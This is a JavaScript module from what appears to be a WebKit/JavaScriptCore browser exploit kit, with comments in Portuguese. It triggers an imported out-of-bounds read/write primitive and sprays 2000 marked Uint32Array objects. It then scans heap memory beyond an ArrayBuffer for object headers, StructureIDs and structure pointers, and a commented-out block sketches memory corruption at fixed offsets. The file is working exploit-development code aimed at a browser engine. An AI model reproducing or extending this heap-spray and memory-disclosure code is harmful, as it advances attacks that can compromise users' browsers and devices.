// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// FUNÇÃO DE INVESTIGAÇÃO
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v12_OOB_Scan"; // Nova versão com escaneamento OOB
    logS3(`--- Iniciando Investigação (${FNAME_SPRAY_INVESTIGATE}): Escaneamento OOB Adjacente ---`, "test", FNAME_SPRAY_INVESTIGATE);

    const NUM_SPRAY_OBJECTS = 2000; // Número razoável para pulverização
    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8;

    let sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
        logS3(`oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_SPRAY_INVESTIGATE);

        // 1. Heap Spraying
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
            arr[0] = (0xFACE0000 | i); // Marcador nos dados do ArrayBuffer do Uint32Array
            sprayedVictimObjects.push(arr);
        }
        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(500); // Pausa para permitir que o heap se estabilize

        // 2. Tentativa de Escaneamento Out-Of-Bounds (após o oob_array_buffer_real)
        logS3(`FASE 2: Tentando leitura Out-Of-Bounds após o oob_array_buffer_real (começando em offset ${toHex(oob_array_buffer_real.byteLength)})...`, "info", FNAME_SPRAY_INVESTIGATE);
        
        // Offsets para JSCell (assumindo que um objeto JS começa no current_potential_jscell_start)
        // Para ArrayBufferView, o StructureID pode estar em 0x0 e Flags em 0x4
        const jscell_sid_offset = JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; // Provavelmente 0x0
        const jscell_flags_offset = JSC_OFFSETS.ArrayBufferView.FLAGS_OFFSET;   // Provavelmente 0x4
        const jscell_structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // Provavelmente 0x8

        const oob_scan_start_offset_in_dataview = oob_array_buffer_real.byteLength;
        const oob_scan_length = 8192; // Escanear 8KB OOB
        let objectsFoundCount = 0;

        for (let i = 0; i < oob_scan_length; i += 8) { // Incrementar de 8 em 8 bytes (tamanho comum de célula de heap ou alinhamento)
            let current_potential_jscell_start = oob_scan_start_offset_in_dataview + i;
            
            // Limitar o log para não sobrecarregar
            let shouldLogDetails = (objectsFoundCount < 10 && i < 512) || (i % 1024 === 0);

            try {
                // Ler o que seria o StructureID e Flags
                let val_sid = oob_read_absolute(current_potential_jscell_start + jscell_sid_offset, 4);
                let val_flags = oob_read_absolute(current_potential_jscell_start + jscell_flags_offset, 4);
                let val_struct_ptr = oob_read_absolute(current_potential_jscell_start + jscell_structure_ptr_offset, 8); // AdvancedInt64

                if (shouldLogDetails) {
                     logS3(`OOB Scan @ DV_Base+${toHex(current_potential_jscell_start)}: SID=${toHex(val_sid)}, Flags=${toHex(val_flags)}, Struct*=${val_struct_ptr.toString(true)}`, 'info', FNAME_SPRAY_INVESTIGATE);
                }

                // Heurística simples: StructureID e Flags não devem ser ambos zero se for um objeto válido.
                // E o ponteiro da Structure não deve ser zero ou um valor muito pequeno.
                if ((val_sid !== 0 || val_flags !== 0) && !val_struct_ptr.equals(AdvancedInt64.Zero) && val_struct_ptr.high() !== 0) { // val_struct_ptr.high() !== 0 para ponteiros "grandes"
                    logS3(`OBJETO POTENCIAL Encontrado em DV_Base+${toHex(current_potential_jscell_start)}: SID=${toHex(val_sid)}, Flags=${toHex(val_flags)}, Struct*=${val_struct_ptr.toString(true)}`, 'leak', FNAME_SPRAY_INVESTIGATE);
                    objectsFoundCount++;
                    // Aqui você poderia adicionar lógica para tentar identificar se é um Uint32Array
                    // if (val_sid === SEU_ESPERADO_UINT32ARRAY_STRUCTURE_ID) { ... }
                    if (objectsFoundCount >= 20) { // Limitar o número de objetos potenciais logados
                        logS3("Muitos objetos potenciais encontrados, parando o log detalhado.", "warn", FNAME_SPRAY_INVESTIGATE);
                        // Poderia parar o scan aqui se já encontrou o que queria.
                        // break; 
                    }
                }

                // Tentar encontrar marcadores 0xFACE nos dados (um pouco mais adiante)
                // Isso é mais especulativo, pois o offset exato dos dados em relação ao JSCell varia.
                // Para Uint32Array, os dados estão dentro de um ArrayBuffer, que é apontado pelo ArrayBufferView.
                // Vamos escanear por marcadores de forma mais genérica na área.
                let data_offset_scan_start = current_potential_jscell_start + 16; // Chute inicial para onde os dados podem começar
                let data_offset_scan_end = data_offset_scan_start + 64;
                for (let k = data_offset_scan_start; k < data_offset_scan_end; k+=4) {
                    if (k + 4 > oob_scan_start_offset_in_dataview + oob_scan_length) break; // Não ler além do scan OOB
                    let data_val = oob_read_absolute(k, 4);
                     if ((data_val & 0xFFFF0000) === 0xFACE0000) {
                        logS3(`MARCADOR 0xFACE... Encontrado em DV_Base+${toHex(k)} (próximo ao objeto potencial em DV_Base+${toHex(current_potential_jscell_start)})`, 'leak', FNAME_SPRAY_INVESTIGATE);
                        // Este marcador está nos dados do ArrayBuffer, não no cabeçalho do ArrayBufferView.
                        break; 
                    }
                }


            } catch (e) {
                if (shouldLogDetails || i === 0) { // Logar o primeiro erro ou erros iniciais
                    logS3(`OOB Scan Error @ DV_Base+${toHex(current_potential_jscell_start)}: ${e.message}`, 'warn', FNAME_SPRAY_INVESTIGATE);
                }
                // Se for RangeError, a primitiva OOB pode ter limites.
                if (e instanceof RangeError) { // Verifique se o erro é realmente RangeError
                    logS3("RangeError atingido durante o escaneamento OOB. A primitiva pode ter limites. Parando scan.", "error", FNAME_SPRAY_INVESTIGATE);
                    break; 
                }
            }
        }
        logS3("FASE 2: Escaneamento Out-Of-Bounds Concluído.", "info", FNAME_SPRAY_INVESTIGATE);


        // A lógica de corrupção em 0x70 e investigação em 0x58 dentro do oob_array_buffer_real
        // foi removida/comentada pois os logs anteriores indicaram que não era eficaz para
        // encontrar StructureIDs de objetos pulverizados dessa forma.
        // Se você quiser reabilitá-la para outros fins, pode descomentar.
        /*
        const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x58;
        const PLANT_MVECTOR_LOW_PART  = 0x00000000;
        const PLANT_MVECTOR_HIGH_PART = 0x00000000;
        const CORRUPTION_OFFSET_TRIGGER = 0x70;
        const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        // ... (código de plantio e corrupção em 0x58/0x68/0x70) ...
        */

        logS3("Investigação focada em escaneamento OOB concluída.", "test", FNAME_SPRAY_INVESTIGATE);

    } catch (e) {
        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
        document.title = "Spray & OOB Scan FALHOU!";
    } finally {
        sprayedVictimObjects = []; // Limpar array para liberar memória
        clearOOBEnvironment();
        logS3(`--- Investigação com Spray (${FNAME_SPRAY_INVESTIGATE}) Concluída ---`, "test", FNAME_SPRAY_INVESTIGATE);
    }
}
